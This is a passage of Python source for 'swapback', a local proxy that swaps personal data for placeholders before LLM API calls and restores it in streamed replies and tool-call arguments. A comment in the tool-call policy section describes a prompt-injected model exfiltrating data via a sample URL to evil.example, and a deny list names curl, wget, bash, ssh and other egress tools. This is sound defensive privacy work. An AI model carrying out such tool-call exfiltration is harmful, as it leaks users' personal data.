                    return len(b) - len(w)
        return len(b)

    def feed(self, chunk):
        if not chunk:
            return chunk
        b = self.buf + chunk
        cut = self._cut(b)
        self.buf = b[cut:]
        return self._out(b[:cut])

    def _out(self, b):
        out = self.s.restore_text(b, self.js, self.stats, self.forms, self.jstate, self.tail)
        self.jstate.feed(out)
        t = self.tail + out                          # what came before, for _fits_here: 300 decoded characters, which
        self.tail = t[-300:] if "\\" not in t[-300:] else t[-(300 << MATCH_DEPTH) - 1024:]   # 8 levels down is ~77 KB
        return out

    def flush(self):
        b, self.buf = self.buf, ""
        return self._out(b)


# ---------------------------------------------------------------- tool-call restore policy
# A tool call's arguments are run by your client, so restoring real values into them hands those values to whatever
# the tool does. A prompt-injected model can ask a web or shell tool to send them out, e.g.
# {"url": "https://evil.example/c?d=«EMAIL_1»"}. By default calls to network/shell-looking tools, and calls whose
# arguments carry a URL, keep the placeholders. Configure with `tool_restore:` (see swapback.example.yaml).
TOOL_RESTORE_DEFAULTS = {
    "default": "restore",        # tools nothing below matches: restore (real values) or keep (placeholders)
    "keep_if_url": True,         # keep placeholders when any argument is or contains a URL
    "allow": [],                 # tool names that always get real values (glob: mcp__github__*)
    "deny": [],                  # tool names that never get real values
    "egress_names": ["fetch*", "http*", "curl", "wget", "web*", "brows*", "request*", "url*", "navigat*",
                     "download*", "upload*", "exec*", "*shell", "bash", "sh", "zsh", "cmd", "terminal", "run", "ssh",
                     "scp", "rsync", "git_push", "push", "email*", "mail", "send", "post", "message", "webhook*",
                     "notify", "publish"],
}
URL_IN_TEXT = re.compile(r"(?i)(?:\b[a-z][a-z0-9+.-]{1,15}://|\bmailto:|\bwww\.[a-z0-9-]+\.|"
                         r"\b(?:[a-z0-9-]+\.)+[a-z]{2,24}(?::\d+)?/)")


def _name_tokens(name):
    n = re.sub(r"([A-Z]+)([A-Z][a-z])", r"\1_\2", str(name or ""))
    n = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", n).lower()
    return re.sub(r"[^a-z0-9]+", "_", n).strip("_")


class ToolPolicy:
    """decides, per tool call, whether the real values go back into its arguments. Order: deny, allow, default: keep,
    an egress name, then keep_if_url on the arguments; otherwise restore. `tool_restore: false` restores every call
    (the 0.2 behaviour)."""

    def __init__(self, conf=True):
        c = dict(TOOL_RESTORE_DEFAULTS)
        if conf is False or (isinstance(conf, str) and conf.strip().lower() in ("off", "false", "restore")):
            c.update(default="restore", keep_if_url=False, egress_names=[])
        elif isinstance(conf, dict):
            c.update({k: v for k, v in conf.items() if v is not None})
        elif conf not in (True, None):
            raise ValueError("tool_restore must be a mapping, true or false")
        d = str(c.get("default")).strip().lower()
        if d not in ("restore", "keep"):
            raise ValueError("tool_restore.default must be restore or keep")
        self.default, self.keep_if_url = d, bool(c.get("keep_if_url"))
        lists = {}
        for k in ("allow", "deny", "egress_names"):
            v = c.get(k) or []
            if isinstance(v, str):
                v = [v]
            if not isinstance(v, list):
                raise ValueError("tool_restore.%s must be a list" % k)
            lists[k] = [str(x).strip().lower() for x in v if str(x).strip()]
        self.allow, self.deny = lists["allow"], lists["deny"]
        self.egress = [re.compile(r"(?:^|_)" + "[a-z0-9]*".join(re.escape(_name_tokens(x)) for x in p.split("*"))
                                  + r"(?:$|_)") for p in lists["egress_names"]]
        self.counts = {"allow": len(self.allow), "deny": len(self.deny), "egress_names": len(self.egress)}

    @staticmethod
    def _listed(name, lst):
        n = str(name or "").lower()
        return any(fnmatch.fnmatchcase(n, p) for p in lst)

    def by_name(self, name):
        """'keep' or 'restore' when the name decides; None when it depends on the arguments."""
        if self._listed(name, self.deny):
            return "keep"
        if self._listed(name, self.allow):
            return "restore"
        if self.default == "keep":
            return "keep"
        n = _name_tokens(name)
        if n and any(rx.search(n) for rx in self.egress):
            return "keep"
        return None if self.keep_if_url else "restore"

    def decide(self, name, raw, restored=None):
        """True = keep placeholders. raw: the arguments as the model wrote them; restored: with values put back."""
        r = self.by_name(name)
        if r is None:
            r = "keep" if (URL_IN_TEXT.search(raw or "") or (restored and URL_IN_TEXT.search(restored))) else "restore"
        return r == "keep"


def tool_call_args(o):
    """(tool name, key of its arguments) when dict o is a tool call the client will run, else None. Shapes: OpenAI
    chat `function` / legacy `function_call` and Responses `function_call` ({name, arguments}), Anthropic `tool_use`
    ({name, input}), Responses `custom_tool_call` ({name, input}) and `local_shell_call` ({action})."""
    t = o.get("type")
    if isinstance(o.get("name"), str) and "arguments" in o:
        return o["name"], "arguments"
    if t in ("tool_use", "custom_tool_call") and "input" in o:
        return str(o.get("name") or ""), "input"
    if t == "local_shell_call" and "action" in o:
        return "local_shell", "action"
    return None


def add_system_note(body, note, api=None, swapped=True):
    """the "keep placeholders as written" note. Appended to an existing system prompt (OpenAI system/developer
    message with string or list content, Anthropic top-level `system` string or blocks, Responses `instructions`);
    when there is none, one is created, but only if this request carries placeholders."""
    if api is None:
        api = "anthropic" if "system" in body else "responses" if ("input" in body and "messages" not in body) else "chat"

    def has(v):
        if isinstance(v, str):
            return note in v
        if isinstance(v, list):
            return any(isinstance(b, dict) and note in str(b.get("text") or "") for b in v)
        return False

    def extend(v):
        if isinstance(v, str):
            return v + "\n\n" + note if v else note
        if isinstance(v, list):
            return v + [{"type": "text", "text": note}]
        return v
    if api == "anthropic":
        s = body.get("system")
        if s and not has(s) and isinstance(s, (str, list)):
            body["system"] = extend(s)
        elif not s and swapped:
            body["system"] = note
        return
    if api == "responses" or ("instructions" in body and "messages" not in body):
        s = body.get("instructions")
        if s and isinstance(s, str) and not has(s):
            body["instructions"] = extend(s)
        elif not s and swapped:
            body["instructions"] = note
        return
    msgs = body.get("messages")
    if not isinstance(msgs, list):
        return
    m0 = msgs[0] if msgs and isinstance(msgs[0], dict) else None
    if m0 is not None and m0.get("role") in ("system", "developer"):
        c = m0.get("content")
        if isinstance(c, (str, list)) and c and not has(c):
            m0["content"] = extend(c)
        elif not c and swapped:
            m0["content"] = note
    elif swapped:
        msgs.insert(0, {"role": "system", "content": note})


class ToolArgsStream:
    """streamed tool-call arguments under the restore policy (feed/flush like StreamRestorer). When the tool's name
    decides, pieces are restored (or passed as written) as they arrive; when the decision needs the whole arguments
    (keep_if_url), they are held and sent at the end of the call, restored or not."""

    def __init__(self, scr, js=True, stats=None, forms=None, name=None):
        self.s, self.stats, self.js = scr, stats, js
        self.inner = StreamRestorer(scr, js, stats, forms)
        self.name, self.mode, self.tried, self.done, self.raw = name or "", None, False, False, []

    def add_name(self, piece):
        if not self.tried and isinstance(piece, str):
            self.name += piece

    def feed(self, chunk):
        if not chunk:
            return chunk
        self.raw.append(chunk)
        if not self.tried:
            self.tried = True
            self.mode = self.s.tool_policy().by_name(self.name)
        if self.mode is None:
            return ""
        return self.inner.feed(chunk) if self.mode == "restore" else chunk

    def flush(self):
        if self.done:
            return ""
        self.done = True
        full = "".join(self.raw)
        if self.mode is None:
            if not full:
                return ""
            keep = self.s.tool_policy().decide(self.name, full, self.s.restore_text(full, self.js))
            self.mode = "keep" if keep else "restore"
            out = (self.inner.feed(full) + self.inner.flush()) if self.mode == "restore" else full
        else:
            out = self.inner.flush() if self.mode == "restore" else ""
        if self.mode == "keep" and self.stats is not None and self.s.has_placeholder(full):
            self.stats["tool_kept"] = self.stats.get("tool_kept", 0) + 1
        return out


def restore_sse_event(scr, ev, state):
    """ev = parsed chat.completion.chunk dict; state = per-stream dict of restorers. Mutates ev."""
    for ch in ev.get("choices") or []:
        i = ch.get("index", 0)
        d = ch.get("delta") or {}
        for f in ("content", "reasoning_content", "reasoning"):
            if isinstance(d.get(f), str):
                r = state.setdefault((i, f), scr.stream_restorer(False, state.setdefault("_stats", {}), state.get("_forms")))
                d[f] = r.feed(d[f])
        for tc in d.get("tool_calls") or []:
            fn = tc.get("function") or {}
            k = (i, "tc", tc.get("index", 0))
            r = state.get(k)
            if r is None:
                r = state[k] = ToolArgsStream(scr, True, state.setdefault("_stats", {}), state.get("_forms"))
            r.add_name(fn.get("name"))
            if isinstance(fn.get("arguments"), str):
                fn["arguments"] = r.feed(fn["arguments"])
        if ch.get("finish_reason"):
            _flush_choice(scr, ch, i, state)
    return ev


def _flush_choice(scr, ch, i, state):
    d = ch.setdefault("delta", {})
    for k, r in list(state.items()):
        if not isinstance(k, tuple) or k[0] != i:
            continue
        rest = r.flush()
        if not rest:
            continue
        if k[1] == "tc":
            tcs = d.setdefault("tool_calls", [])
            tc = next((t for t in tcs if t.get("index", 0) == k[2]), None)
            if tc is None:
                tc = {"index": k[2], "function": {"arguments": ""}}
                tcs.append(tc)
            fn = tc.setdefault("function", {})
            fn["arguments"] = (fn.get("arguments") or "") + rest
        else:
            d[k[1]] = (d.get(k[1]) or "") + rest


ANTHROPIC_EVENTS = frozenset(("message_start", "content_block_start", "content_block_delta", "content_block_stop",
                              "message_delta", "message_stop", "ping", "error"))
_ANTH_FIELDS = {"text_delta": ("text", False), "input_json_delta": ("partial_json", True)}


def is_anthropic_event(ev):
    return isinstance(ev, dict) and ev.get("type") in ANTHROPIC_EVENTS and "choices" not in ev


def restore_anthropic_event(scr, ev, state):
    """Anthropic /v1/messages stream event (parsed `data:` JSON); state = per-stream dict. Mutates ev and returns a
    list of extra content_block_delta events to send BEFORE it: a placeholder split across deltas is held back until it
    is whole, and what is held is flushed just before the block's content_block_stop (or message_stop). text_delta is
    restored as text, input_json_delta (tool_use input) as JSON text. thinking deltas are left as sent (signed)."""
    rs = state.setdefault("_anth", {})
    stats = state.setdefault("_stats", {})
    forms = state.get("_forms")
    t = ev.get("type")
    if t == "content_block_start" and isinstance(ev.get("content_block"), dict):
        cb = ev["content_block"]
        if cb.get("type") in ("text", "tool_use"):
            ev["content_block"] = scr.restore_obj(cb, stats, forms=forms)
        if cb.get("type") == "tool_use":            # its input_json_delta pieces go through the restore policy
            rs[ev.get("index", 0)] = ("input_json_delta", ToolArgsStream(scr, True, stats, forms, cb.get("name")))
        return []
    if t == "content_block_delta":
        d = ev.get("delta") or {}
        f = _ANTH_FIELDS.get(d.get("type"))
        if f and isinstance(d.get(f[0]), str):
            i = ev.get("index", 0)
            r = rs.get(i)
            if r is None:
                r = rs[i] = (d["type"], scr.stream_restorer(f[1], stats, forms))
            d[f[0]] = r[1].feed(d[f[0]])
        return []
    if t == "content_block_stop":
        return _anth_flush(rs, [ev.get("index", 0)])
    if t == "message_stop":
        return _anth_flush(rs, sorted(rs))
    return []


def _anth_flush(rs, idx):
    out = []
    for i in idx:
        r = rs.pop(i, None)
        if r is None:
            continue
        rest = r[1].flush()
        if rest:
            out.append({"type": "content_block_delta", "index": i, "delta": {"type": r[0], _ANTH_FIELDS[r[0]][0]: rest}})
    return out


def flush_anthropic(state):
    """leftovers at EOF of an Anthropic stream -> extra content_block_delta events (normally empty)."""
    return _anth_flush(state.get("_anth") or {}, sorted(state.get("_anth") or {}))


def flush_all(scr, state, template=None):
    """leftovers at [DONE]/EOF -> one synthetic chunk (or None)."""
    ev = dict(template or {})
    ev["choices"] = []
    idx = sorted({k[0] for k in state if isinstance(k, tuple) and isinstance(k[0], int)})
    for i in idx:
        ch = {"index": i, "delta": {}, "finish_reason": None}
        _flush_choice(scr, ch, i, state)
        if ch["delta"]:
            ev["choices"].append(ch)
    return ev if ev["choices"] else None


# ---------------------------------------------------------------- OpenAI Responses API streams
_RESP_TEXT = {"response.output_text.delta": ("delta", "response.output_text.done", "text"),
              "response.refusal.delta": ("delta", "response.refusal.done", "refusal"),
              "response.reasoning_summary_text.delta": ("delta", "response.reasoning_summary_text.done", "text"),
              "response.reasoning_text.delta": ("delta", "response.reasoning_text.done", "text")}
_RESP_DONE = {v[1]: (k, v[2]) for k, v in _RESP_TEXT.items()}
_RESP_TOOL = {"response.function_call_arguments.delta": ("response.function_call_arguments.done", "arguments"),
              "response.custom_tool_call_input.delta": ("response.custom_tool_call_input.done", "input")}
_RESP_TOOL_DONE = {v[0]: (k, v[1]) for k, v in _RESP_TOOL.items()}


def is_responses_event(ev):
    return isinstance(ev, dict) and str(ev.get("type") or "").startswith("response.") and "choices" not in ev


def _rkey(ev, kind):
    return ("resp", kind, ev.get("output_index", 0), ev.get("content_index", ev.get("summary_index", 0)))


def restore_responses_event(scr, ev, state):
    """OpenAI Responses API stream event (parsed `data:` JSON); state = per-stream dict. Mutates ev and returns a list
    of extra delta events to send BEFORE it. Text deltas (output_text, refusal, reasoning) are restored with a split
    placeholder held until whole; function_call_arguments / custom_tool_call_input deltas go through the tool restore
    policy (ToolArgsStream). What is held is sent as one more delta just before the matching `.done` event. Snapshots
    (`.done` events, output_item.*, content_part.*, response.created/completed) are restored whole, tool items under
    the same policy. sequence_number is renumbered so it stays unique and increasing when a delta is added."""
    stats = state.setdefault("_stats", {})
    forms = state.get("_forms")
    rs = state.setdefault("_resp", {})
    t = ev.get("type")
    pre = []
    if t in _RESP_TEXT:
        k = _rkey(ev, t)
        ent = rs.get(k)
        if ent is None:
            ent = rs[k] = {"r": scr.stream_restorer(False, stats, forms)}
        _resp_feed(ent, ev)
    elif t in _RESP_TOOL:
        k = ("resp", "tool", ev.get("output_index", 0))
        ent = rs.get(k)
        if ent is None:
            ent = rs[k] = {"r": ToolArgsStream(scr, True, stats, forms, state.setdefault("_resp_names", {}).get(ev.get("output_index", 0)))}
        _resp_feed(ent, ev)
    elif t in _RESP_DONE:
        dt, field = _RESP_DONE[t]
        ent = rs.get(_rkey(ev, dt))
        pre += _resp_flush(rs, [_rkey(ev, dt)])
        if isinstance(ev.get(field), str):              # the snapshot says what the restored deltas said
            ev[field] = ent["out"] if ent is not None and ent["raw"] == ev[field] else \
                scr.restore_text(ev[field], False, None, None)
    elif t in _RESP_TOOL_DONE:
        k = ("resp", "tool", ev.get("output_index", 0))
        ent = rs.get(k)
        pre += _resp_flush(rs, [k])
        field = _RESP_TOOL_DONE[t][1]
        if isinstance(ev.get(field), str):
            if ent is not None and ent["raw"] == ev[field]:
                ev[field] = ent["out"]
            elif not scr.tool_keep(ev.get("name") or state.setdefault("_resp_names", {}).get(ev.get("output_index", 0)) or "",
                                   ev[field]):
                ev[field] = scr.restore_text(ev[field], True, None, None)
    elif t in ("response.output_item.added", "response.output_item.done") and isinstance(ev.get("item"), dict):
        item = ev["item"]
        if t == "response.output_item.added" and tool_call_args(item) is not None:
            state.setdefault("_resp_names", {})[ev.get("output_index", 0)] = tool_call_args(item)[0]
        if t == "response.output_item.done":
            oi = ev.get("output_index", 0)
            pre += _resp_flush(rs, [k for k in list(rs) if k[2] == oi])
        ev["item"] = scr.restore_obj(item, None, forms=None)
    elif t in ("response.content_part.added", "response.content_part.done") and isinstance(ev.get("part"), dict):
        ev["part"] = scr.restore_obj(ev["part"], None, forms=None)
    elif t == "response.output_text.annotation.added" and isinstance(ev.get("annotation"), dict):
        ev["annotation"] = scr.restore_obj(ev["annotation"], None, forms=None)
    elif isinstance(ev.get("response"), dict):            # created / in_progress / completed / incomplete / failed
        if t in ("response.completed", "response.incomplete", "response.failed"):
            pre += _resp_flush(rs, list(rs))
        ev["response"] = scr.restore_obj(ev["response"], None, forms=None)
    return _resp_seq(state, pre, ev)


def _resp_feed(ent, ev):
    ent["tmpl"] = dict(ev)
    if isinstance(ev.get("delta"), str):
        ent["raw"] = ent.get("raw", "") + ev["delta"]
        ev["delta"] = ent["r"].feed(ev["delta"])
        ent["out"] = ent.get("out", "") + ev["delta"]


def _resp_flush(rs, keys):
    out = []
    for k in keys:
        ent = rs.pop(k, None)
        if ent is None:
            continue
        rest = ent["r"].flush()
        ent.setdefault("raw", "")
        ent["out"] = ent.get("out", "") + rest
        if rest and ent.get("tmpl"):
            e = dict(ent["tmpl"])
            e["delta"] = rest
            out.append(e)
    return out


def _resp_seq(state, pre, ev):
    off = state.get("_resp_seq", 0)
    if isinstance(ev.get("sequence_number"), int):
        for n, e in enumerate(pre):
            e["sequence_number"] = ev["sequence_number"] + off + n
        off += len(pre)
        ev["sequence_number"] += off
    state["_resp_seq"] = off
    return pre


def flush_responses(state):
    """leftovers at EOF of a Responses stream -> extra delta events (normally empty)."""
    rs = state.get("_resp") or {}
    return _resp_flush(rs, list(rs))


# ---------------------------------------------------------------- alerts (optional generic webhook)
def alert(cfg, text):
    """POST {"text": "swapback: ..."} to cfg alert_webhook (Slack/Discord-compatible incoming webhook), at most once
    per alert_min_interval_s. The text never includes a value. Returns a status word."""
    import urllib.request
    url = cfg.get("alert_webhook")
    if not url:
        return "no_webhook"
    p = os.path.join(state_dir(cfg), "alert_last.json")
    try:
        last = json.load(open(p)).get("ts", 0)
    except (OSError, ValueError):
        last = 0
    if time.time() - last < float(cfg.get("alert_min_interval_s", 3600)):
        return "rate_limited"
    try:
        req = urllib.request.Request(url, method="POST", data=json.dumps({"text": "swapback: " + text[:300]}).encode(),
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            ok = 200 <= r.status < 300
        _write_private(p, {"ts": time.time(), "ok": ok})
        return "sent" if ok else "refused"
    except Exception as e:
        return "error:" + type(e).__name__


# ---------------------------------------------------------------- health + canary
def _http(method, url, body=None, headers=None, timeout=120):
    import urllib.request
    req = urllib.request.Request(url, data=json.dumps(body).encode() if body is not None else None, method=method,
                                 headers=dict({"Content-Type": "application/json"}, **(headers or {})))
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, json.loads(r.read() or b"{}")


def health(cfg=None):
    cfg = cfg or load_cfg()
    try:
        return _http("GET", "http://%s/scrubber/health" % cfg["listen"], timeout=5)[1]
    except Exception as e:
        return {"ok": False, "error": type(e).__name__}


def canary(cfg=None, model=None, auth=None):
    """Send a fake person + email through the running proxy and prove the provider got placeholders only:
    1) raw mode (X-Scrubber-Raw: 1): the provider's echo must not hold the fake values;
    2) normal mode: the swap-back must give the fake values back. auth: Authorization header value
    (default: "Bearer $OPENAI_API_KEY" when set)."""
    cfg = cfg or load_cfg()
    model = model or cfg.get("canary_model")
    res = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "mode": cfg["mode"], "health": health(cfg)}
    if not model:
        res.update(error="set canary_model (config) or SWAPBACK_CANARY_MODEL", **{"pass": False})
        return res
    fake = [v for v, _ in CANARY]
    msg = {"model": model, "stream": False, "max_tokens": 80, "temperature": 0,
           "messages": [{"role": "system", "content": "You copy text exactly. Output only the copied text."},
                        {"role": "user", "content": "Copy this line exactly: Contact %s at %s about the canary." % tuple(fake)}]}
    url = "http://%s/v1/chat/completions" % cfg["listen"]
    auth = auth or ("Bearer " + os.environ["OPENAI_API_KEY"] if os.environ.get("OPENAI_API_KEY") else None)
    h = {"Authorization": auth} if auth else {}
    try:
        _, raw = _http("POST", url, json.loads(json.dumps(msg)), dict(h, **{"X-Scrubber-Raw": "1"}))
        rt = ((raw.get("choices") or [{}])[0].get("message") or {}).get("content") or ""
        res["provider_saw_fake"] = any(f.lower() in rt.lower() for f in fake)
        res["provider_echoed_placeholder"] = bool(re.search(L + r"(PERSON|EMAIL)_\d+" + R, rt))
        _, rest = _http("POST", url, json.loads(json.dumps(msg)), h)
        tt = ((rest.get("choices") or [{}])[0].get("message") or {}).get("content") or ""
        res["restored_fake_back"] = any(f.lower() in tt.lower() for f in fake)
    except Exception as e:
        res["error"] = "request: " + type(e).__name__
    res["pass"] = cfg["mode"] == "on" and "error" not in res and not res.get("provider_saw_fake") \
        and bool(res.get("restored_fake_back"))
    _write_private(os.path.join(state_dir(cfg), "canary.json"), res)
    if not res["pass"] and cfg["mode"] == "on":
        alert(cfg, "canary FAILED (%s)" % (", ".join(k for k in ("provider_saw_fake", "error") if res.get(k)) or "check"))
    return res


CLI_ENV_HELP = '''configuration (environment):
  SWAPBACK_CONFIG     path to the YAML config file. Default: ./swapback.yaml if it
                      exists, else built-in defaults. The pre-0.2 name
                      PII_SCRUBBER_CONFIG is still read when SWAPBACK_CONFIG is unset
                      (deprecated); every SWAPBACK_* variable has the same fallback.
  SWAPBACK_LISTEN     host:port the proxy listens on (default 127.0.0.1:8787), or
                      `listen:` in the config. Off loopback also needs
                      `allow_remote: true` in the config.
  SWAPBACK_UPSTREAM   provider base URL (default https://api.openai.com), or
                      `upstream:` in the config.
  also: SWAPBACK_MODE, SWAPBACK_KNOWN_FILE, SWAPBACK_PRIVATE_TERMS,
        SWAPBACK_STATE_DIR, SWAPBACK_ALERT_WEBHOOK, SWAPBACK_CANARY_MODEL.
  Environment variables override the config file. See swapback.example.yaml.'''

_COMMANDS = (
    ("stats", "counts for the loaded config and vault (default command)",
     "Print counts for the loaded config: known values, private rules, vault size. Never prints a value."),
    ("check-config", "show what the proxy would load (counts per type, never values)",
     "Load the config the way the proxy does and print the mode, listen address, upstream, state directory, and "
     "counts per type of known values and private terms. Never prints a value. Run it before starting the proxy; a "
     "broken config fails here."),
    ("health", "status of the running proxy (mode, counters, last error)",
     "Ask the running proxy at the config's listen address for its status (GET /scrubber/health): mode, request "
     "and block counters, last error."),
    ("canary", "end-to-end check through the running proxy (exit 1 on failure)",
     "Send a fake name and email through the running proxy to the real provider. Passes when the provider saw only "
     "placeholders and the reply got the values back; exits 1 otherwise. Needs canary_model in the config or "
     "SWAPBACK_CANARY_MODEL, and the provider's key (OPENAI_API_KEY)."),
    ("selftest", "run the built-in leak test (made-up data, 7 request paths) and print the numbers",
     "Start a recording fake model and the proxy on loopback ports with a fixed list of made-up values shipped in the "
     "package (accented names, names that are also ordinary phrases, emails, phones in several countries, IDs, "
     "addresses), send each value in several written forms through 7 request paths (chat, streams, tool-call "
     "arguments and json.dumps tool results, Anthropic, Responses) and print how many listed values were caught, "
     "how many forms leaked, how many ordinary sentences were left untouched, how many round trips were exact and "
     "how many unlisted values the pattern detectors caught. No network, no config, no API key. Exit code 0 on "
     "PASS (nothing leaked, every round trip exact, at least 95 percent of ordinary sentences untouched)."),
    ("init", "write a starter swapback.yaml and known.yaml (from the examples shipped in the package)",
     "Write swapback.yaml, known.yaml and private_terms.example.yaml into the current directory (or --dir) from the example files shipped with "
     "the package, with 0600 permissions. Existing files are left alone unless --force. Edit known.yaml (or build it "
     "with `swapback known init`), then run `swapback check-config`."),
    ("demo", "see it work in 10 seconds: a built-in fake model, no API key, no config",
     "Start a built-in fake model (it echoes what it receives) and a proxy in front of it on free loopback ports, "
     "send one plain, one streamed and one tool-call request with made-up personal data, and show what your app "
     "sent, what the model received and what came back. Needs no config, no API key and no network; writes only "
     "to a temporary directory it removes. Exits 1 if the model saw a real value or the reply was not restored."),
    ("scrub-file", "scrub one request JSON locally and print counts and time",
     "Scrub one OpenAI-style request JSON file locally (nothing is sent anywhere) and print the counts per type and "
     "the time it took. Never prints a value."),
)


EXAMPLES = (("swapback.example.yaml", "swapback.yaml"), ("known.example.yaml", "known.yaml"),
            ("private_terms.example.yaml", "private_terms.example.yaml"))


def example_text(name):
    """the text of an example file shipped in the package (swapback/examples/)."""
    from importlib import resources
    return resources.files("swapback").joinpath("examples", name).read_text(encoding="utf-8")


def init_files(d=".", force=False):
    """write swapback.yaml and known.yaml from the packaged examples (0600). Prints what it did; returns an exit code."""
    os.makedirs(d, exist_ok=True)
    done = {}
    for src, dst in EXAMPLES:
        p = os.path.join(d, dst)
        if os.path.exists(p) and not force:
            done[dst] = "exists (kept; --force to overwrite)"
            continue
        fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(example_text(src))
        os.chmod(p, 0o600)
        done[dst] = "written"
    print(json.dumps({"dir": os.path.abspath(d), "files": done,
                      "next": "edit known.yaml (or: swapback known init), then: swapback check-config"}))
    return 0


def _version():
    from . import __version__
    return __version__


def cli_parser():
    import argparse
    ap = argparse.ArgumentParser(
        prog="swapback", formatter_class=argparse.RawDescriptionHelpFormatter,
        description="swapback: swap personal data for placeholders before an LLM call and put it back in the reply.\n"
                    "These commands inspect the config and the running proxy; `swapback-proxy` starts the proxy.",
        epilog=CLI_ENV_HELP + "\n\nWith no command, swapback runs `stats`. `swapback COMMAND --help` describes one command.")
    ap.add_argument("--version", action="version", version="swapback " + _version())
    sub = ap.add_subparsers(dest="cmd", metavar="COMMAND", title="commands")
    for name, short, desc in _COMMANDS:
        sp = sub.add_parser(name, help=short, description=desc)
        if name == "scrub-file":
            sp.add_argument("file", metavar="IN.json", help="an OpenAI-style request body (JSON)")
        if name == "selftest":
            sp.add_argument("--json", action="store_true", help="print the numbers as one JSON object")
        if name == "init":
            sp.add_argument("--dir", default=".", help="where to write the files (default: the current directory)")
            sp.add_argument("--force", action="store_true", help="overwrite existing files")
    from . import known
    known.add_parser(sub)
    return ap


def _quiet_pipe():
    """stdout went away (`swapback --help | head`): exit quietly, as other command-line tools do."""
    try:
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())
    except (OSError, ValueError):
        pass
    sys.exit(0)


def main(argv=None):
    try:
        _main(argv)
    except BrokenPipeError:
        _quiet_pipe()


def _main(argv=None):
    argv = sys.argv if argv is None else argv
    args = cli_parser().parse_args(argv[1:])          # --help/--version/bad input exit here, before any config load
    cmd = args.cmd or "stats"
    if cmd == "demo":                                 # needs no config: it brings its own
        from . import demo
        sys.exit(demo.run())
    if cmd == "selftest":                             # needs no config: it brings its own made-up data
        from . import selftest
        sys.exit(selftest.main(as_json=args.json))
    if cmd == "init":                                 # needs no config: it writes one
        sys.exit(init_files(args.dir, args.force))
    if cmd == "known":                                # works without a config; uses its known_file when there is one
        from . import known
        try:
            kcfg = load_cfg()
        except Exception:
            kcfg = dict(DEFAULTS)
        sys.exit(known.run(args, kcfg))
    try:
        cfg = load_cfg()
    except ConfigError as e:                          # missing or broken config file: one line, no traceback
        print("swapback: error: %s" % e, file=sys.stderr)
        sys.exit(2)
    try:
        _run_cmd(cmd, cfg, args)
    except ScrubError as e:                           # missing or broken known/private file: one line, no traceback
        print("swapback: error: %s" % e, file=sys.stderr)
        sys.exit(2)


def _run_cmd(cmd, cfg, args):
    if cmd == "stats":
        s = Scrubber(cfg)
        print(json.dumps({"mode": cfg["mode"], "known": s.known_count(), "private_rules": len(s.private),
                          "vault": len(s.rev), "ctr": s.ctr}))
    elif cmd == "check-config":
        out = {"mode": cfg["mode"], "listen": cfg["listen"], "upstream": cfg["upstream"], "state_dir": state_dir(cfg)}
        tp = ToolPolicy(cfg.get("tool_restore", True))
        out["tool_restore"] = dict(default=tp.default, keep_if_url=tp.keep_if_url, **tp.counts)
        warn, notes = [], []
        if cfg.get("known_file"):
            k = load_known(cfg["known_file"])
            by = listed_count(k, by_type=True)            # unique listed values (a phone's formats count once)
            out["known_by_type"] = by
            if not k and not cfg.get("allow_empty_known"):
                warn.append("known_file has no values: the proxy blocks every request until you add some (or set "
                            "allow_empty_known: true)")
            warn += known_warnings(cfg["known_file"], k, cfg.get("common_names_title_case", True))
            phones = [v for v, t in _known_originals(cfg["known_file"]) if t == "PHONE"]
            non_us = sum(1 for v in phones if not _is_us_phone(v))
            if non_us:
                notes.append("%d listed phone(s) are not US numbers: matched as written and by their digits in any "
                             "grouping; US formats are added only for US numbers" % non_us)
        else:
            notes.append("no known_file: only the pattern detectors run (names are never detected without a list)")
        if warn:
            out["warnings"] = warn
        if notes:
            out["notes"] = notes
        if cfg.get("private_terms_file"):
            out["private"] = build_private_terms(cfg["private_terms_file"])[1]
        if cfg.get("hooks"):
            from . import hooks as _hooks
            h = _hooks.Hooks(cfg)                       # imports the module; setup() runs only in the proxy
            out["hooks"] = {"module": h.name, "functions": sorted(h.fns)}
        print(json.dumps(out))
        if cfg.get("known_file") and not out.get("known_by_type") and not cfg.get("allow_empty_known"):
            print("swapback: check-config: known_file has no values, so the proxy would block every request",
                  file=sys.stderr)
            sys.exit(2)
    elif cmd == "scrub-file":
        s = Scrubber(cfg)
        counts = {}
        t0 = time.perf_counter()
        with open(args.file, encoding="utf-8") as f:
            body = json.load(f)
        s.scrub_request(body, counts)
        print(json.dumps({"counts": counts, "ms": round((time.perf_counter() - t0) * 1000, 2)}))
    elif cmd == "health":
        h = health(cfg)
        print(json.dumps(h))
        sys.exit(0 if h.get("ok") else 1)             # not ok (blocked, warning, unreachable): non-zero for scripts
    elif cmd == "canary":
        r = canary(cfg)
        print(json.dumps(r))
        sys.exit(0 if r["pass"] else 1)


if __name__ == "__main__":
    main()
